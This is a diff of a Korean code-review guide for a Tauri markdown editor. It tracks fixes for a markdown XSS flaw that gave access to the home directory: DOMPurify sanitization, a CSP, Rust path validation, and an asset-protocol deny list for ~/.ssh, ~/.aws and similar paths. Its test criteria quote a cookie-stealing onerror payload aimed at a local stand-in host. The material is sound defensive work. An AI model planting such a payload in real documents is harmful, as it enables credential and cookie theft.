@@ -1,15 +1,15 @@
 # Devoras 코드 리뷰 & 리팩터링 통합 가이드
 
-> **최종 갱신**: **2026-08-29 (3차 — 진행 현황 반영)** | **대상 버전**: `v0.8.26`
+> **최종 갱신**: **2026-08-30 (4차 — B2 L1~L4-deny·L2 구현 반영)** | **대상 버전**: `v0.8.31`
 > **통합 이력**: 2026-08-15 최초 리뷰 + 2026-08-26 v0.8.2 재리뷰 통합 → 2026-08-26 DEBUG_PLAN 실행 결과 반영
-> → **2026-08-29 B1 종결·B2 착수 반영(본 갱신, 아래 「진행 현황」 참조)**
+> → 2026-08-29 B1 종결·B2 착수 반영 → **2026-08-30 B2 L1(새니타이즈)·L4-deny·L3(경로 검증)·L2(CSP) 구현 완료 반영(본 갱신, 아래 「진행 현황」 참조)**
 > **리뷰 형식**: **[파일 & 라인] ➔ [근본 원인] ➔ [조치 방안]**
 > **경로 표기**: 모든 경로는 저장소 루트 기준입니다.
 
 
 ---
 
-# 📊 진행 현황 (2026-08-29 기준, v0.8.26)
+# 📊 진행 현황 (2026-08-30 기준, v0.8.31)
 
 > 이 절은 **본 리뷰 이후 실제로 무엇이 처리됐는지**를 추적한다.
 > 아래 표의 "리뷰 시점" 열은 2026-08-26 기록이며, 그 뒤의 변화만 여기서 갱신한다.
@@ -20,7 +20,7 @@
 |---|---|---|---|---|
 | **B0** 공통 인프라 | — | ✅ 해결 | ✅ 유지 | — |
 | **B1** 데이터 보호 | BUG-04·06·07 | ⚠️ 구현만, DoD 미검증 | ✅ **종결 (v0.8.25)** | 하네스 3종 작성·통과. 검증 중 **결함 2건 추가 발견·수정** ↓ |
-| **B2** 보안 | BUG-01 (P0-1) | ❌ 미해결 | 🔄 **착수 — 계획 수립 완료** | [`project/DEBUG_PLAN.md`](project/DEBUG_PLAN.md) |
+| **B2** 보안 | BUG-01 (P0-1) | ❌ 미해결 | 🟡 **L1·L4-deny·L3·L2 구현 완료 (v0.8.28~0.8.31) — L4-scope·T3 실기 잔여** | [`project/DEBUG_PLAN.md`](project/DEBUG_PLAN.md), 아래 「B2 — L1~L4-deny·L2 구현」 |
 | **B3** 입력 안정성 | BUG-08·09·10·11 | 미착수 | ◻ 미착수 (BUG-08 은 G0 로 해소) | — |
 | **B4** 구조 | REF-01·02 | 미착수 | ◻ 미착수 | — |
 
@@ -39,7 +39,33 @@
 
 기록: [`claude-history/debug/DEBUG_PLAN_20260829_063211.md`](claude-history/debug/DEBUG_PLAN_20260829_063211.md)
 
-## P0-1(B2) — 리뷰 기술 중 **낡은 부분 정정**
+## B2 — L1·L4-deny·L3·L2 구현 완료 (v0.8.28~0.8.31). L4-scope·T3 실기 검증 잔여
+
+[`project/DEBUG_PLAN.md`](project/DEBUG_PLAN.md) §3~4 대로 L1 → L4-deny → L3 → L2 순서로 **4개 커밋으로 분리 구현**했다.
+커밋 전 패치 버전업을 매 커밋마다 수행(`.agents/AGENTS.md` 컨벤션).
+
+| 레이어 | 커밋 | 요지 |
+|---|---|---|
+| L1 새니타이즈 | `fix(0.8.28)` | `renderBlockToHtml` 을 `DOMPurify.sanitize` 로 감쌈. `safeText` 를 `escapeHtml` 로 일원화. 블록당 재파싱+새니타이즈 캐시 추가 |
+| L4-deny 자산 scope | `fix(0.8.29)` | `assetProtocol.scope.deny` 에 `~/.ssh`·`~/.aws`·`~/.gnupg`·`~/.config`·`~/.env*` 추가. 미사용 권한 8건(`fs:allow-{desktop,document,download}-*-recursive` 6건 + `dialog:allow-message` + `shell:allow-open`) 제거 |
+| L3 Rust 경로 검증 | `fix(0.8.30)` | `WorkspaceRoot` Rust 상태 도입(워크스페이스 루트를 invoke 인자가 아닌 서버 상태에서 읽음). `save_image_file` → `devoras_image_save` 개명 + `ensure_inside`(canonicalize+starts_with) 검증. `devoras_set_workspace_root` 신규 커맨드 |
+| L2 CSP | `fix(0.8.31)` | `csp`/`devCsp` 동시 지정(`script-src 'self'`, devCsp 만 HMR 용 `unsafe-inline` 허용) |
+
+**설계와 달라진 지점 (구현 중 발견한 결함 2건)**
+
+1. **sanitize→resolveAssetPaths 순서 반전**: DEBUG_PLAN·본 문서 §L1 스니펫은 `DOMPurify.sanitize(resolveAssetPaths(html, workspacePath), ...)` 순서였으나, DOMPurify 기본 URI 허용목록에 `asset:` 스킴이 없어 이 순서대로 하면 **이미지 `src` 가 통째로 제거된다.** `sanitize` 를 먼저 적용하고 `resolveAssetPaths` 를 그 결과에 적용하도록 뒤집었다(`ReadView.tsx`).
+2. **`ensure_inside` 조상 탐색 일반화**: 원안 스니펫(`target.parent()` 1단계만 확인)은 `.devoras/images` 처럼 **하위 디렉터리가 아직 없는 최초 이미지 저장**에서 `canonicalize` 가 실패해 저장이 깨질 수 있었다. 존재하는 조상을 찾을 때까지 올라가도록 일반화(`lib.rs`).
+
+**검증 상태**
+
+- **T1 (S1)** — `sanitizer_harness.ts` 14/14 통과: §1.1 실측 5벡터 무력화 + `data-code` 속성 이탈 방지(DOM 파싱 기준) + KaTeX/mark/코드블록 과잉제거 없음.
+- **T1-rs (S3)** — `cargo test` 6/6 통과: 정상 저장, 상위 디렉터리 미존재, `../` 탈출, 워크스페이스 밖 절대경로, 심볼릭 링크 탈출, 존재하지 않는 루트.
+- **T3 라이브 확인 (S1)** — `pnpm tauri dev` 로 실제 앱에서 §1.1 5벡터를 Read 모드로 열어 전부 무력화됨을 확인.
+- **T3 부분 확인 (S2)** — `pnpm tauri build --debug` 번들 앱(`tauri://` 프로토콜, 진짜 프로덕션 CSP 적용 경로)에서 strict `script-src` 가 인라인 스크립트 주입·`eval()` 을 실제로 차단하는 것까지 확인(자동화 도구 자신의 스크립트 주입도 막힐 정도). 콘솔 CSP 위반 로그·네트워크 0건까지는 **자동화 도구(Tauri MCP Bridge)가 `tauri://` 커스텀 프로토콜과 호환되지 않아 미확인.**
+- **미확인 (S4, S5)** — `asset://.../.ssh/id_rsa` 403 실측, 번들 앱에서 이미지·코드블록 육안 확인, `pnpm tauri build` 후 HMR 무관 정상 동작. 도구·OS 권한(Accessibility·Screen Recording) 한계로 이 세션에서는 미완.
+- **미착수 (L4-scope)** — `allow: ["**"]` 제거는 DEBUG_PLAN 자체가 "1시간 PoC 선행 후 별도" 로 규정한 항목이라 이번 배치 범위 밖.
+
+## P0-1(B2) — 리뷰 기술 중 **낡은 부분 정정** *(2026-08-29 스냅샷 — 위 「B2 구현」 절 참조)*
 
 2026-08-29 재확인 결과, L1 항목의 기술 일부가 현재 코드와 다르다.
 
@@ -166,65 +192,49 @@ v0.8.4에서 **`blockStore.ownerTabId` 소유권 태그**가 도입되면서 "�
 
 > P0-2 · P0-4 · P0-6은 v0.8.4에서 해소되어 **부록 A**로 이관되었습니다. 아래 3건이 현재 남은 P0입니다.
 
-## P0-1. 신뢰할 수 없는 마크다운 → 임의 코드 실행 + 홈 디렉터리 전체 접근 **[미해결 · 심각도 상승]**
+## P0-1. 신뢰할 수 없는 마크다운 → 임의 코드 실행 + 홈 디렉터리 전체 접근 **[대부분 해결 — L4-scope PoC·T3 실기 검증 잔여]**
 
-> 🔄 **2026-08-29 — B2 배치로 착수. 실행 계획은 [`project/DEBUG_PLAN.md`](project/DEBUG_PLAN.md).**
-> 아래 L1 기술 중 "`escapeHtml` 헬퍼 추가"는 **이미 적용된 상태**다(위 「진행 현황」의 정정 표 참조).
-> L2·L3·L4 는 기술 그대로 미해결.
+> ✅ **2026-08-30 — B2 배치로 L1·L4-deny·L3·L2 구현 완료(v0.8.28~0.8.31).**
+> 실행 근거는 [`project/DEBUG_PLAN.md`](project/DEBUG_PLAN.md), 요약은 위 「B2 — L1·L4-deny·L3·L2 구현 완료」 참조.
+> 아래는 **구현 시점 기준으로 갱신된 현재 상태**이며, 취소선 처리한 부분은 더 이상 유효하지 않다.
 
 **[파일 & 라인]**
-`project/src/widgets/BlockEditor/ui/ReadView.tsx:16, 35, 41, 92, 433`
-`project/src-tauri/tauri.conf.json:39-49` · `project/src-tauri/src/lib.rs:12-32` · `project/src-tauri/capabilities/default.json`
+`project/src/widgets/BlockEditor/ui/ReadView.tsx` (새니타이즈·렌더 캐시)
+`project/src-tauri/tauri.conf.json` (CSP·asset scope) · `project/src-tauri/src/lib.rs`(`devoras_image_save`·`ensure_inside`) · `project/src-tauri/capabilities/default.json`
 
-**[근본 원인]**
-DEBUG_PLAN §6에 4개 레이어(L1 새니타이즈 / L2 CSP / L3 Rust 경로 검증 / L4 권한 최소화) 대책이 수립되었으나 **어느 것도 적용되지 않았습니다.** 현재 코드 상태:
+**[해소된 부분]**
 
-1. **새니타이저 부재** — `package.json` dependencies에 `dompurify` **없음**. `preprocessMd`가 `==...==`를 raw `<mark>`로 주입하고, 코드 펜스의 `|title|="..."`(라인 41)은 이스케이프 없이 보간되며 결과가 `dangerouslySetInnerHTML`(라인 433)로 삽입됩니다.
-2. **CSP 부재** — `tauri.conf.json:40` `"csp": null` 유지. `<img src=x onerror=...>` 등 인라인 이벤트 핸들러가 그대로 실행됩니다.
-3. **Rust 경로 무검증** — `save_image_file`(lib.rs:12)이 `String` 경로를 검증 없이 `std::fs::create_dir_all` + `std::fs::write`에 전달합니다. 주석에 plugin-fs scope 우회가 **의도적으로 명시**되어 있습니다. *(`read_image_base64`는 P1-8 해소로 삭제되어 읽기 측 공격면은 축소)*
-4. **권한 과다** — `capabilities/default.json`에 `fs:allow-home-{read,write}-recursive` 등 재귀 권한 **8건 전량 잔존** + `shell:allow-open`.
+1. **새니타이저 도입 (L1)** — `dompurify` 의존성 추가, `renderBlockToHtml` 결과를 `DOMPurify.sanitize` 로 감쌈. `safeText`(구 `:62`)도 `escapeHtml` 로 일원화. T1 하네스(`sanitizer_harness.ts`) 14/14 통과 + dev 모드 실제 앱에서 5벡터 무력화 라이브 확인.
+2. **CSP 도입 (L2)** — `tauri.conf.json` 에 `csp`/`devCsp` 동시 지정. 번들 앱(`tauri build --debug`)에서 strict `script-src` 가 인라인 스크립트·`eval()` 을 실제로 차단하는 것까지 확인.
+3. **Rust 경로 검증 (L3)** — `save_image_file` → `devoras_image_save` 로 개명하고 `WorkspaceRoot` Rust 상태 + `ensure_inside`(canonicalize+starts_with) 로 워크스페이스 밖 쓰기·심볼릭 링크 우회를 거부. `cargo test` 6/6 통과(정상 저장/상위 디렉터리 미존재/`../`탈출/워크스페이스 밖 절대경로/심볼릭 링크 탈출/존재하지 않는 루트).
+4. **asset scope 민감 경로 차단 (L4-deny)** — `assetProtocol.scope.deny` 에 `~/.ssh`·`~/.aws`·`~/.gnupg`·`~/.config`·`~/.env*` 추가. 미사용 재귀 권한 8건(`fs:allow-{desktop,document,download}-*-recursive` 6건 + `dialog:allow-message` + `shell:allow-open`) 제거.
 
-**🔺 이번 갱신에서 상승한 부분 — asset scope의 dot 파일 개방**
+**[잔존하는 부분]**
 
-v0.8.5의 403 수정은 `assetProtocol.scope`를 다음으로 바꾸었습니다.
+1. **L4-scope — `allow: ["**"]` 자체는 그대로.** 워크스페이스 선택 시 런타임 동적 허용(`fs_scope().allow_directory()` / `asset_protocol_scope().allow_directory()`)으로 와일드카드 자체를 제거하는 것이 최종 목표였으나, DEBUG_PLAN이 규정한 "**API 가용성 PoC 1시간 선행**"이 아직 이번 배치에 포함되지 않았다. 현재는 `deny` 목록 + L3 검증에 의존하는 상태(강도 하락 인지된 상태로 유지 중).
+2. **T3 실기 검증 일부 미완** — 아래 DoD의 2·3번(항목 참조)이 도구·OS 권한 한계로 미확인. S1(새니타이즈)·S2(CSP 차단 자체)는 실제 앱에서 확인했으나, `asset://` 403 실측과 CSP 위반 콘솔 로그·네트워크 0건·번들 앱 이미지/코드블록 육안 확인은 이 세션에서 완료하지 못했다(자동화 도구가 `tauri://` 프로토콜과 호환되지 않았고, macOS Accessibility/Screen Recording 권한도 세션 재시작 없이는 얻을 수 없었음).
 
-```json
-"scope": { "allow": ["**"], "deny": [], "requireLiteralLeadingDot": false }
-```
+**[적용된 구현 — 참고용 최종 스니펫]**
 
-`allow: ["**"]` 는 **파일시스템 전체**를 의미하고, 여기에 `requireLiteralLeadingDot: false`가 더해지면서 이전까지 glob이 막아주던 **dot 디렉터리까지 asset 프로토콜로 읽을 수 있게** 되었습니다. 즉 `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/**`가 `asset://` 한 번으로 도달 가능합니다.
-
-DEBUG_PLAN §4는 이를 "P0-1의 심각도를 바꾸지 않는다"고 평가했으나, 이는 **`deny` 목록이 함께 도입될 것을 전제한 판단**이었습니다. `deny: []`로 배포된 현재 상태에서는 **XSS 성립 시 유출 가능 자산의 종류가 실제로 늘어났으므로**, P0-1은 이전보다 우선순위를 더 높게 잡아야 합니다. 이 항목은 **v0.8.5 기준 유일하게 앱 경계를 넘는 결함**입니다.
-
-**[조치 방안]**
-DEBUG_PLAN §6의 L1~L4를 그대로 적용하되, **L2·L4에 아래 두 가지를 추가**합니다.
-
-```bash
-pnpm add dompurify && pnpm add -D @types/dompurify
-```
 ```typescript
-// ReadView.tsx — L1
-import DOMPurify from 'dompurify';
+// ReadView.tsx — L1. sanitize 를 resolveAssetPaths 보다 먼저 적용한다: DOMPurify 기본
+// URI 허용목록에 `asset:` 스킴이 없어 순서를 반대로 하면 이미지 src 가 통째로 제거된다.
+const SANITIZE_CONFIG: DOMPurifyConfig = {
+  USE_PROFILES: { html: true, mathMl: true, svg: true },
+  ADD_ATTR: ['data-src', 'data-code'],
+};
 
-const escapeHtml = (s: string) =>
-  s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
-   .replace(/</g, '&lt;').replace(/>/g, '&gt;');   // & 를 반드시 먼저 치환
-
-function renderBlockToHtml(content: string, workspacePath: string | null): string {
+export function renderBlockToHtml(content: string, workspacePath: string | null): string {
   const html = markedParser.parse(preprocessMd(content)) as string;
-  return DOMPurify.sanitize(resolveAssetPaths(html, workspacePath), {
-    USE_PROFILES: { html: true, mathMl: true, svg: true },   // katex 의존성 존재
-    ADD_ATTR: ['data-src', 'data-code'],
-  });
+  const sanitized = DOMPurify.sanitize(html, SANITIZE_CONFIG);
+  const resolved = resolveAssetPaths(sanitized, workspacePath);
+  return resolved; // 렌더 캐시 생략 — 실제 구현 참조
 }
 ```
 ```json
-// tauri.conf.json — L2 (csp / devCsp 동시 지정 필수. devCsp 누락 시 Vite HMR 붕괴)
+// tauri.conf.json — L2 + L4-deny (현재 값)
 "csp":    "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost",
-"devCsp": "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self' 'unsafe-inline'; connect-src 'self' ipc: http://ipc.localhost ws://localhost:1420 http://localhost:1420"
-```
-```json
-// tauri.conf.json — L4 즉시 적용분: requireLiteralLeadingDot 유지하되 민감 경로를 명시 차단
+"devCsp": "default-src 'self'; img-src 'self' asset: http://asset.localhost data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self' 'unsafe-inline'; connect-src 'self' ipc: http://ipc.localhost ws://localhost:1420 http://localhost:1420",
 "assetProtocol": {
   "enable": true,
   "scope": {
@@ -235,25 +245,35 @@ function renderBlockToHtml(content: string, workspacePath: string | null): strin
 }
 ```
 ```rust
-// lib.rs — L3. 워크스페이스 루트는 JS 인자가 아니라 Rust 상태에서 읽는다(XSS는 invoke 인자를 위조 가능)
-struct WorkspaceRoot(std::sync::Mutex<Option<std::path::PathBuf>>);
-
+// lib.rs — L3. 원안(DEBUG_PLAN §6) 은 target 의 부모 한 단계만 확인해, .devoras/images
+// 처럼 하위 디렉터리가 아직 없는 최초 저장에서 canonicalize 가 실패할 수 있었다.
+// 존재하는 조상을 찾을 때까지 올라가도록 일반화했다.
 fn ensure_inside(root: &std::path::Path, path: &str) -> Result<std::path::PathBuf, String> {
     let target = std::path::Path::new(path);
-    let probe = if target.exists() { target } else { target.parent().unwrap_or(target) };
-    let probe = std::fs::canonicalize(probe).map_err(|e| e.to_string())?;
-    let root  = std::fs::canonicalize(root).map_err(|e| e.to_string())?;
-    if !probe.starts_with(&root) { return Err("워크스페이스 외부 경로 접근이 거부되었습니다".into()); }
+    let mut probe = target;
+    while !probe.exists() {
+        match probe.parent() {
+            Some(parent) if !parent.as_os_str().is_empty() => probe = parent,
+            _ => break,
+        }
+    }
+    let probe_canon = std::fs::canonicalize(probe).map_err(|e| e.to_string())?;
+    let root_canon = std::fs::canonicalize(root).map_err(|e| e.to_string())?;
+    if !probe_canon.starts_with(&root_canon) {
+        return Err("워크스페이스 외부 경로 접근이 거부되었습니다".into());
+    }
     Ok(target.to_path_buf())
 }
 ```
-- `save_image_file` → `devoras_image_save`로 개명(`architecture_stages` Stage 1의 `devoras_{domain}_{action}` 컨벤션)하고, 진입부에서 `ensure_inside` 통과 후에만 `std::fs` 접근.
-- 최종 목표는 워크스페이스 선택 시 런타임 동적 허용(`fs_scope().allow_directory()` / `asset_protocol_scope().allow_directory()`)으로 `"**"` 자체를 제거하는 것입니다. **API 가용성 PoC 1시간 선행** 후 판단하고, 불가 시 위 `deny` 목록 + L3 검증에 의존합니다(강도 하락을 문서화).
+
+**[남은 조치 방안]**
+- L4-scope PoC(1시간) → 가능하면 `"**"` 제거, 불가하면 현재 `deny` 의존 상태를 정식으로 확정.
+- T3 잔여 항목(아래 DoD 2·3번)은 Accessibility/Screen Recording 권한을 가진 환경, 또는 사용자 직접 육안 확인으로 마무리.
 
 **[DoD]**
-1. 페이로드 `![x](x" onerror="fetch('http://127.0.0.1:9/'+document.cookie))` 포함 `.md`를 Read 모드로 열어 **네트워크 요청 0건 / 콘솔 CSP 차단 로그 확인**.
-2. `asset://localhost/Users/<user>/.ssh/id_rsa` 직접 요청 → **403**.
-3. `pnpm tauri dev` HMR 정상, `pnpm tauri build` 후 이미지·코드블록 복사 버튼 정상.
+1. ~~페이로드 `![x](x" onerror="fetch('http://127.0.0.1:9/'+document.cookie))` 포함 `.md`를 Read 모드로 열어 네트워크 요청 0건 / 콘솔 CSP 차단 로그 확인~~ — **CSP 가 인라인 실행 자체를 차단하는 것은 확인**, 콘솔 로그·네트워크 0건 재확인은 잔여.
+2. `asset://localhost/Users/<user>/.ssh/id_rsa` 직접 요청 → **403**. *(미확인 — 잔여)*
+3. `pnpm tauri dev` HMR 정상, `pnpm tauri build` 후 이미지·코드블록 복사 버튼 정상. *(미확인 — 잔여. T1/T1-rs·`pnpm build`·`cargo build`·`cargo clippy` 는 전부 통과)*
 
 ---
 
@@ -544,7 +564,7 @@ set({ activeBlockId: rebuilt[index - 1]?.id ?? null, focusOffset });
 
 | 순위 | 항목 | 유형 | 영향도 | 난이도 |
 |---|---|---|---|---|
-| 1 | **P0-1** 마크다운 XSS → 임의 파일 접근 *(dot 파일 개방으로 상승)* | 🔒 보안 | 치명 | 중간 |
+| 1 | **P0-1** 마크다운 XSS → 임의 파일 접근 *(L1~L4-deny·L2 구현 완료, L4-scope PoC·T3 잔여 → §P0-1 참조)* | 🔒 보안 | 낮음(잔여분) | 쉬움(PoC) |
 | 2 | **P0-5** dirty 탭 무경고 파괴 | 🔴 데이터 로스 | 높음 | 쉬움 |
 | 3 | **P0-3** 분할 패널 표시 불일치 (Stage A-2 잔여) | 🟠 UX/구조 | 중간 | 중간 |
 | 4 | P1-4 비헤딩 블록 키 충돌 (커서 유실) | 🟡 버그 | 중간 | 중간 |
@@ -562,7 +582,7 @@ set({ activeBlockId: rebuilt[index - 1]?.id ?? null, focusOffset });
 
 1. **런타임 검증부터 (0.5일)** — v0.8.5의 asset 프로토콜 수정은 아직 **정적 검증만** 되어 있습니다. `pnpm tauri dev` 후 DEBUG_PLAN §5.2의 V1~V8을 실행해 이 항목을 확정 종료하십시오. 이것이 열려 있는 한 P1-8(이미지 렌더링)의 회귀 여부도 미확정입니다.
 2. **이번 스프린트 (데이터 안전성 마무리)** — **P0-5**. P0-2·P0-4·P0-6이 해소되어 "편집이 살아남는다"는 신뢰가 생긴 만큼, 닫기 경로의 소실이 유일하게 남은 데이터 로스입니다. 국소 수정이며 P1-2(dirty 기준선)와 묶으면 가드 정확도까지 함께 올라갑니다.
-3. **외부 파일 공유/배포 이전 필수** — **P0-1**. 유일하게 앱 경계를 넘어 파급되는 결함이며, `deny: []` + `requireLiteralLeadingDot: false` 조합으로 노출 자산이 늘어난 상태입니다. **최소한 `deny` 목록만이라도 즉시 반영**하고(설정 1줄, 재빌드 필요), L1~L3은 별도 커밋으로 진행하십시오.
+3. ~~외부 파일 공유/배포 이전 필수 — P0-1~~ — **L1(새니타이즈)·L4-deny·L3(경로 검증)·L2(CSP) 구현 완료(v0.8.28~0.8.31).** 남은 것은 L4-scope(`"**"` 제거 PoC 1시간)와 T3 실기 검증 잔여(asset:// 403 실측, 번들 앱 육안 확인)뿐입니다 — §P0-1 「잔존하는 부분」 참조.
 4. **커서 유실 계열 일괄 처리** — **P1-4 → P1-7 → P2-5**. 세 항목이 동일 증상(리마운트로 인한 포커스·IME 조합 유실)으로 수렴하므로 개별 대응하면 원인 판별이 어렵습니다. 한 묶음으로 처리 후 `ticket/debug/`의 커서 점프 이슈를 재현 테스트하십시오.
 5. **메모리 최적화 스프린트와 병행** — P1-3, P2-1, P2-2, P2-3. P1-8이 해소되어 **최대 단일 할당원은 이미 제거**되었으므로, 다음 병목은 리렌더 범위입니다.
 6. **v1.0.0 탭 스코프 리팩터링에 통합** — P0-3 Stage B. `advanced_rendering_optimization` Phase 1(상태 스냅샷)과 **동일 지점**이므로 반드시 함께 처리합니다.
@@ -622,10 +642,10 @@ set({ activeBlockId: rebuilt[index - 1]?.id ?? null, focusOffset });
 
 | 파일명 | 상태 | 조치 |
 |---|---|---|
-| `code_review.md` (루트) | ✅ 본 문서 — v0.8.5 기준 최신 | 유지 (단일 소스) |
+| `code_review.md` (루트) | ✅ 본 문서 — v0.8.31 기준 최신 | 유지 (단일 소스) |
 | `project/CODE_REVIEW.md` | 전 내용이 본 문서에 반영됨 | 삭제 가능. **미추적(untracked) 파일이므로 삭제 시 복구 불가** — 확인 후 진행 |
 | `advanced_rendering_optimization.md` (루트) | ✅ 통합 완료 | 유지. **§5의 P1-8 행을 "해결됨"으로 갱신 필요** |
-| `project/DEBUG_PLAN.md` | asset:// 403 계획서, 실행 완료(런타임 검증 잔여) | 런타임 V1~V8 확인 후 `claude-history/debug/`로 아카이브 |
+| `project/DEBUG_PLAN.md` | **B2(P0-1) 계획서** — L1·L4-deny·L3·L2 실행 완료, L4-scope PoC·T3 실기 잔여 *(이전 asset:// 403 계획서는 이미 교체됨)* | L4-scope PoC + T3 잔여 확인 후 `claude-history/debug/`로 아카이브 |
 | `claude-history/debug/DEBUG_PLAN_20260826_170853.md` | P0 계획서, 아카이브됨 | 유지 — **P0-1·P0-5 미실행분의 원본 설계이므로 재착수 시 참조** |
 | `reference_project/…/settings.ts` ↔ `project/src/entities/erd/model/settings.ts` | ⚠️ 차이 129줄 — 이식본이 원본의 1/7 수준 | 🔎 **확인 필요** — 의도적 축소인지 이식 누락인지 판단 후 티켓화 |
 | `.serena/project.yml` (루트 / `project/`) | 도구 설정 중복, 이름만 상이 | 🔎 Serena 활성 프로젝트를 하나로 정리 권장 |
